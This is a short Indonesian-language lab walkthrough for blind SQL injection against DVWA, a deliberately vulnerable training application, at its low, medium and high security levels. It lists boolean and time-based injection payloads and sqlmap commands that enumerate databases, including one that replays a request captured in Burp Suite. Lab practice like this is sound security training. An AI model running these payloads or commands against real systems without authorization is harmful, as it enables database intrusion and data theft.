## SQL Injection (Blind)
Blind SQL Injection muncul ketika aplikasi rentan terhadap SQL Injection, tetapi respons HTTP-nya tidak berisi hasil kueri SQL yang relevan atau detail kesalahan basis data apa pun.

### Security Low
```sh
1' and length(database())=4#
```

![alt text](https://github.com/rahardian-dwi-saputra/dvwa-tricks/blob/main/assets/dt%2011.JPG)

- Menemukan database dengan tool sqlmap
```sh
sqlmap -u "http://<IP_Server>/DVWA/vulnerabilities/sqli_blind/?id=1&Submit=Submit#" --cookie="PHPSESSID=hash; security=low" --dbs
```

![alt text](https://github.com/rahardian-dwi-saputra/dvwa-tricks/blob/main/assets/dt%2054.JPG)

![alt text](https://github.com/rahardian-dwi-saputra/dvwa-tricks/blob/main/assets/dt%2055.JPG)

### Security Medium
- Lakukan injeksi pada tag `<option>` menggunakan inspect element di browser
```sh
1 and sleep(5)
```

![alt text](https://github.com/rahardian-dwi-saputra/dvwa-tricks/blob/main/assets/dt%2012.JPG)

- Kembali ke halaman seperti semula, tangkap request pada halaman **SQL Injection (Blind)** dengan **Security Medium** menggunakan tool Burp Suite. Klik kanan pada kolom **Request** dan pilih **Save Item**

![alt text](https://github.com/rahardian-dwi-saputra/dvwa-tricks/blob/main/assets/dt%2056.JPG)

![alt text](https://github.com/rahardian-dwi-saputra/dvwa-tricks/blob/main/assets/dt%2057.JPG)

![alt text](https://github.com/rahardian-dwi-saputra/dvwa-tricks/blob/main/assets/dt%2058.JPG)

- Lakukan SQL Injection pada request dengan tool sqlmap
```sh
sqlmap -r nama_file_request --dbs
```

![alt text](https://github.com/rahardian-dwi-saputra/dvwa-tricks/blob/main/assets/dt%2059.JPG)

![alt text](https://github.com/rahardian-dwi-saputra/dvwa-tricks/blob/main/assets/dt%2060.JPG)

### Security High
```sh
sqlmap -u "http://<IP_Server>/DVWA/vulnerabilities/sqli_blind/?id=1" --cookie="PHPSESSID=hash; security=high" --dbs
```
